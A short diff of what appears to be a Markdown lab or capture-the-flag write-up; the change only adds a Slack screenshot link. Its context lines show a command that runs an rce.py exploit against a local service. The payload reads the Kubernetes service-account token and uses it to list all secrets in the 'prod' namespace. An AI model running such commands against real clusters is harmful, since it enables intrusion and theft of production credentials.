@@ -229,3 +229,5 @@ kubectl -n monitoring rollout restart deploy/grafana
 python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=\$(cat \$SA/token);curl -sS --cacert \$SA/ca.crt -H \"Authorization: Bearer \$TOKEN\" \$APISERVER/api/v1/namespaces/prod/secrets"
 
 ```
+
+![slack](./img/slack.png)
